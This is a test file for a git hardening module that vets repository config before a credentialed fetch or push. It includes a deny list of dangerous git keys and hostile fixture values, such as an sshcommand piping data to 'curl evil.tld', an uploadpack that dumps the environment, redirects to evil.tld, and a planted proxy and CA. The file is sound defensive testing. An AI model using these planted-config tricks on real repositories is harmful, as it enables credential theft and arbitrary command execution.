import { describe, expect, it } from 'vitest';
import {
	credentialedCommandEntries,
	credentialedProtocol,
	foreignRepositoryConfig,
	isAllowedRepositoryConfigKey,
	parseScopedConfigList,
	privateRemoteName,
	type ScopedConfigEntry
} from '../credentialed-command.js';

/**
 * The decisions of `credentialed-command.ts`, without git: which transport
 * a credential may use, which repository-scope keys the allowlist accepts,
 * and which command-scope entries a credentialed child is given.
 *
 * What those decisions DO against a planted config, with real git, is
 * `credentialed-command.attacks.spec.ts`.
 */

const URL_HTTPS = 'https://github.com/ever-works/ever-works.git';

const local = (key: string, value = 'x'): ScopedConfigEntry => ({ scope: 'local', key, value });
const scoped = (scope: string, key: string, value: string): ScopedConfigEntry => ({ scope, key, value });

const entriesFor = (config: ScopedConfigEntry[], env: NodeJS.ProcessEnv = {}, remoteUrl = URL_HTTPS) =>
	new Map(
		credentialedCommandEntries({
			remoteName: 'ew-credentialed-test',
			remoteUrl,
			protocol: credentialedProtocol(remoteUrl) ?? 'https',
			config,
			env
		})
	);

describe('credentialedProtocol — the one transport a credentialed child may speak', () => {
	it('is https for every URL the fleet issues a credential for', () => {
		expect(credentialedProtocol(URL_HTTPS)).toBe('https');
	});

	it('is file for a repository on disk (the hermetic suites, a local mirror)', () => {
		expect(credentialedProtocol('file:///srv/git/repo.git')).toBe('file');
	});

	it.each([
		['plain http — the header would cross the wire in clear', 'http://github.com/o/r.git'],
		['ssh', 'ssh://git@github.com/o/r.git'],
		['scp-like ssh', 'git@github.com:o/r.git'],
		['git://', 'git://github.com/o/r.git'],
		['a remote helper', 'ext::sh -c true'],
		['a bare path', '/srv/git/repo.git'],
		['nothing', '']
	])('is NONE for %s', (_label, url) => {
		expect(credentialedProtocol(url)).toBeNull();
	});
});

describe('privateRemoteName', () => {
	it('is unguessable and different every time', () => {
		const names = new Set(Array.from({ length: 50 }, () => privateRemoteName()));
		expect(names.size).toBe(50);
		for (const name of names) expect(name).toMatch(/^ew-credentialed-[0-9a-f-]{36}$/);
	});

	it('is a name the allowlist would accept a section for — which is why it has to be unguessable', () => {
		// `remote.<plain name>.url` is allowed (people add remotes). So the
		// only thing between a planted section and the credentialed command
		// is that the name does not exist until the command does.
		expect(isAllowedRepositoryConfigKey(`remote.${privateRemoteName()}.url`)).toBe(true);
	});
});

describe('parseScopedConfigList', () => {
	it('reads scope, key and value, newlines in a value included', () => {
		const stdout = [
			'system',
			'core.autocrlf\ntrue',
			'local',
			'remote.origin.url\nhttps://x/y.git',
			'local',
			'x.y\na\nb',
			''
		].join('\0');

		expect(parseScopedConfigList(stdout)).toEqual([
			{ scope: 'system', key: 'core.autocrlf', value: 'true' },
			{ scope: 'local', key: 'remote.origin.url', value: 'https://x/y.git' },
			{ scope: 'local', key: 'x.y', value: 'a\nb' }
		]);
	});

	it('reads a key with no value at all', () => {
		expect(parseScopedConfigList(['local', 'core.bare', ''].join('\0'))).toEqual([
			{ scope: 'local', key: 'core.bare', value: '' }
		]);
	});

	it('reads an empty listing as no keys', () => {
		expect(parseScopedConfigList('')).toEqual([]);
	});

	it.each([
		['text that is not a listing', 'fatal: not a git repository'],
		['a truncated record', 'local\0core.bare\ntrue'],
		['a record with no scope', '\0core.bare\ntrue\0'],
		['a key with no section', 'local\0bare\ntrue\0']
	])('answers null — never "empty" — for %s', (_label, stdout) => {
		// An unreadable config must not be mistaken for a clean one.
		expect(parseScopedConfigList(stdout)).toBeNull();
	});
});

describe('the allowlist — what the repository’s own config may carry', () => {
	it.each([
		// What `git init --bare`, `git remote add` and `git worktree add -B` write.
		'core.repositoryformatversion',
		'core.filemode',
		'core.bare',
		'core.symlinks',
		'core.ignorecase',
		'core.logallrefupdates',
		'core.precomposeunicode',
		'remote.origin.url',
		'remote.origin.fetch',
		'branch.task/x.remote',
		'branch.task/x.merge',
		'extensions.objectformat',
		'extensions.refstorage',
		// What tooling writes into a checkout.
		'core.hookspath',
		'core.fsmonitor',
		'core.autocrlf',
		'core.longpaths',
		'user.name',
		'user.email',
		'commit.gpgsign',
		'pull.rebase',
		'merge.conflictstyle',
		'lfs.repositoryformatversion',
		'lfs.https://github.com/o/r.git/info/lfs.access',
		'filter.lfs.clean',
		'filter.lfs.smudge',
		'filter.lfs.process',
		'filter.lfs.required',
		'submodule.vendor/lib.url',
		'submodule.vendor/lib.active',
		'remote.upstream.url',
		'remote.upstream.fetch',
		'remote.upstream.pushurl',
		'remote.origin.gh-resolved',
		'remote.pushdefault',
		'branch.main.gh-merge-base',
		'gc.auto',
		'maintenance.auto',
		'http.postbuffer',
		'http.lowspeedlimit',
		'fetch.prune',
		'push.autosetupremote',
		'push.default',
		'transfer.fsckobjects',
		'extensions.worktreeconfig',
		'core.sparsecheckout'
	])('allows %s', (key) => {
		expect(isAllowedRepositoryConfigKey(key)).toBe(true);
	});

	it.each([
		// The review's finding, and its siblings on the same section.
		`remote.${URL_HTTPS}.url`,
		`remote.${URL_HTTPS}.uploadpack`,
		`remote.${URL_HTTPS}.receivepack`,
		`remote.${URL_HTTPS}.pushurl`,
		`remote.${URL_HTTPS}.vcs`,
		`remote.${URL_HTTPS}.proxy`,
		`remote.${URL_HTTPS}.fetch`,
		`remote.${URL_HTTPS}.mirror`,
		'remote.file:///srv/repo.git.uploadpack',
		// A plain-named remote may exist; it may not name a program or a proxy.
		'remote.origin.uploadpack',
		'remote.origin.receivepack',
		'remote.origin.vcs',
		'remote.origin.proxy',
		'remote.origin.promisor',
		'remote.origin.partialclonefilter',
		// Programs.
		'core.sshcommand',
		'core.gitproxy',
		'core.askpass',
		'core.alternaterefscommand',
		'core.editor',
		'core.pager',
		'core.unsetenvvars',
		'core.worktree',
		'gc.recentobjectshook',
		'pack.someobjectshook',
		'diff.external',
		'diff.pdf.textconv',
		'diff.pdf.command',
		'merge.ours.driver',
		'gpg.program',
		'gpg.ssh.program',
		'pager.fetch',
		'alias.fetch',
		'sequence.editor',
		'uploadpack.packobjectshook',
		// Where the request goes and whom it trusts.
		'credential.helper',
		'credential.https://github.com.helper',
		'http.proxy',
		'http.sslverify',
		'http.sslcainfo',
		'http.sslcapath',
		'http.sslbackend',
		'http.curloptresolve',
		'http.followredirects',
		'http.extraheader',
		'http.cookiefile',
		`http.${URL_HTTPS}.extraheader`,
		`http.${URL_HTTPS}.postbuffer`,
		'url.https://evil.tld/.insteadof',
		'url.https://evil.tld/.pushinsteadof',
		'protocol.allow',
		'protocol.file.allow',
		'ssh.variant',
		// What pulls other config in, or other objects.
		'include.path',
		'includeif.gitdir:/x/.path',
		'extensions.partialclone',
		'fetch.bundleuri',
		'promisor.advertise',
		// Signing and recursion a push could be talked into.
		'push.gpgsign',
		'push.negotiate',
		'push.pushoption',
		// Anything nobody has heard of.
		'ewunknown.setting',
		'core.somethingnew',
		'nosection'
	])('refuses %s', (key) => {
		expect(isAllowedRepositoryConfigKey(key)).toBe(false);
	});

	it('judges only the repository’s own scopes — the operator’s config is the operator’s', () => {
		const config = [
			scoped('system', 'credential.helper', 'manager'),
			scoped('global', 'core.sshcommand', 'C:/Windows/System32/OpenSSH/ssh.exe'),
			scoped('global', 'http.proxy', 'http://proxy.corp:8080'),
			scoped('command', 'url.file:///x/.insteadof', 'https://github.com/'),
			local('core.bare', 'true'),
			local('remote.origin.url', URL_HTTPS)
		];

		expect(foreignRepositoryConfig(config)).toEqual([]);
	});

	it('treats the per-worktree file, and any scope it does not know, as the repository’s', () => {
		const config = [
			scoped('worktree', 'core.sshcommand', 'evil'),
			scoped('some-future-scope', 'http.proxy', 'http://evil'),
			local('core.bare', 'true')
		];

		expect(foreignRepositoryConfig(config)).toEqual(['core.sshcommand', 'http.proxy']);
	});

	it('names what it refuses as section.variable — never a subsection, never a value', () => {
		const config = [
			local('url.https://user:ghp_secretInASubsection@evil.tld/.insteadof', 'https://github.com/'),
			local(`remote.${URL_HTTPS}.uploadpack`, 'env > /tmp/x; git-upload-pack'),
			local(`remote.${URL_HTTPS}.url`, '/srv/decoy.git'),
			local('core.sshcommand', 'curl evil.tld -d @-'),
			local('weird section!.thing', 'x'),
			local(`remote.${URL_HTTPS}.uploadpack`, 'twice')
		];

		const names = foreignRepositoryConfig(config);

		expect(names).toEqual([
			'url.<…>.insteadof',
			'remote.<…>.uploadpack',
			'remote.<…>.url',
			'core.sshcommand',
			'<…>.thing'
		]);
		expect(names.join(' ')).not.toContain('ghp_secretInASubsection');
		expect(names.join(' ')).not.toContain('evil.tld');
		expect(names.join(' ')).not.toContain('github.com');
	});
});

describe('credentialedCommandEntries — what a credentialed child is given at exec time', () => {
	it('defines the private remote and switches off every program a fetch or a push could be made to start', () => {
		const entries = entriesFor([]);

		expect(entries.get('remote.ew-credentialed-test.url')).toBe(URL_HTTPS);
		expect(entries.get('core.fsmonitor')).toBe('false');
		expect(entries.get('core.alternateRefsCommand')).toBe('');
		expect(entries.get('maintenance.auto')).toBe('false');
		expect(entries.get('gc.auto')).toBe('0');
		expect(entries.get('push.gpgSign')).toBe('false');
		expect(entries.get('fetch.recurseSubmodules')).toBe('false');
		expect(entries.get('push.recurseSubmodules')).toBe('no');
		// Git for Windows' own default: nothing else is unset for its children.
		expect(entries.get('core.unsetenvvars')).toBe('PERL5LIB');
	});

	it('pins the connection to its DEFAULTS when the operator configured nothing', () => {
		const entries = entriesFor([]);

		expect(entries.get(`http.${URL_HTTPS}.sslVerify`)).toBe('true');
		expect(entries.get(`http.${URL_HTTPS}.proxy`)).toBe('');
		expect(entries.get(`http.${URL_HTTPS}.followRedirects`)).toBe('initial');
		expect(entries.get(`http.${URL_HTTPS}.schannelUseSSLCAInfo`)).toBe('false');
		expect(entries.get(`http.${URL_HTTPS}.curloptResolve`)).toBe('');
		// There is no value that means "the built-in CA bundle", so these are
		// not invented.
		expect(entries.has(`http.${URL_HTTPS}.sslCAInfo`)).toBe(false);
		expect(entries.has(`http.${URL_HTTPS}.sslCAPath`)).toBe(false);
		expect(entries.has(`http.${URL_HTTPS}.sslBackend`)).toBe(false);
	});

	it('re-asserts the OPERATOR’s own posture, so a proxied or unverified machine behaves as it did', () => {
		const entries = entriesFor([
			scoped('system', 'http.sslbackend', 'schannel'),
			scoped('system', 'http.sslcainfo', 'C:/Program Files/Git/mingw64/etc/ssl/certs/ca-bundle.crt'),
			scoped('global', 'http.proxy', 'http://proxy.corp:8080'),
			scoped('global', 'http.sslverify', 'false'),
			scoped('global', 'core.unsetenvvars', 'PERL5LIB,FOO'),
			scoped('command', 'http.curloptresolve', 'github.com:443:10.0.0.7')
		]);

		expect(entries.get(`http.${URL_HTTPS}.proxy`)).toBe('http://proxy.corp:8080');
		expect(entries.get(`http.${URL_HTTPS}.sslVerify`)).toBe('false');
		expect(entries.get(`http.${URL_HTTPS}.sslBackend`)).toBe('schannel');
		expect(entries.get(`http.${URL_HTTPS}.sslCAInfo`)).toBe(
			'C:/Program Files/Git/mingw64/etc/ssl/certs/ca-bundle.crt'
		);
		expect(entries.get('core.unsetenvvars')).toBe('PERL5LIB,FOO');
		// The operator pinned a resolution of their own: not cleared.
		expect(entries.has(`http.${URL_HTTPS}.curloptResolve`)).toBe(false);
	});

	it('takes NOTHING from the repository’s own scopes — that is the config it is defending against', () => {
		const entries = entriesFor([
			local('http.proxy', 'http://evil:8080'),
			local('http.sslverify', 'false'),
			local('http.sslcainfo', '/tmp/planted-ca.pem'),
			local('http.curloptresolve', 'github.com:443:6.6.6.6'),
			local('core.unsetenvvars', 'GIT_ALLOW_PROTOCOL'),
			scoped('worktree', 'http.proxy', 'http://evil:8081')
		]);

		expect(entries.get(`http.${URL_HTTPS}.proxy`)).toBe('');
		expect(entries.get(`http.${URL_HTTPS}.sslVerify`)).toBe('true');
		expect(entries.has(`http.${URL_HTTPS}.sslCAInfo`)).toBe(false);
		expect(entries.get(`http.${URL_HTTPS}.curloptResolve`)).toBe('');
		expect(entries.get('core.unsetenvvars')).toBe('PERL5LIB');
	});

	it('leaves a key alone when the operator configured it PER URL', () => {
		// Which `http.<url>.*` entry applies to a URL is Git's own matching.
		// Guessing it wrong would pin the wrong proxy on somebody's machine,
		// so such a key is not touched at all.
		const entries = entriesFor([
			scoped('global', 'http.https://github.com/.proxy', 'http://gh-proxy.corp:3128'),
			scoped('global', 'http.proxy', 'http://proxy.corp:8080'),
			scoped('system', 'http.https://internal.corp/.sslverify', 'false')
		]);

		expect(entries.has(`http.${URL_HTTPS}.proxy`)).toBe(false);
		expect(entries.has(`http.${URL_HTTPS}.sslVerify`)).toBe(false);
		// Unrelated keys are still pinned.
		expect(entries.get(`http.${URL_HTTPS}.followRedirects`)).toBe('initial');
	});

	it.each([
		[
			'https_proxy wins over HTTPS_PROXY',
			{ https_proxy: 'http://lower:1', HTTPS_PROXY: 'http://upper:1' },
			'http://lower:1'
		],
		['HTTPS_PROXY alone', { HTTPS_PROXY: 'http://upper:1' }, 'http://upper:1'],
		['all_proxy only when no https variable is set', { all_proxy: 'socks5://all:1' }, 'socks5://all:1'],
		[
			'an https variable beats all_proxy',
			{ all_proxy: 'socks5://all:1', https_proxy: 'http://lower:1' },
			'http://lower:1'
		],
		['an https variable set to empty means no proxy', { https_proxy: '', all_proxy: 'socks5://all:1' }, ''],
		['http_proxy is not for an https URL', { http_proxy: 'http://plain:1' }, ''],
		['nothing set', {}, '']
	])('with no http.proxy of the operator’s, takes the proxy git itself would: %s', (_label, env, expected) => {
		expect(entriesFor([], env).get(`http.${URL_HTTPS}.proxy`)).toBe(expected);
	});

	it('adds no connection settings for a repository on disk', () => {
		const entries = entriesFor([], {}, 'file:///srv/git/repo.git');

		expect([...entries.keys()].some((key) => key.startsWith('http.'))).toBe(false);
		expect(entries.get('remote.ew-credentialed-test.url')).toBe('file:///srv/git/repo.git');
		expect(entries.get('core.alternateRefsCommand')).toBe('');
	});

	it('never carries the credential — these entries know the remote, not the token', () => {
		const entries = credentialedCommandEntries({
			remoteName: 'ew-credentialed-test',
			remoteUrl: URL_HTTPS,
			protocol: 'https',
			config: [],
			env: {}
		});

		expect(JSON.stringify(entries)).not.toContain('Authorization');
	});
});
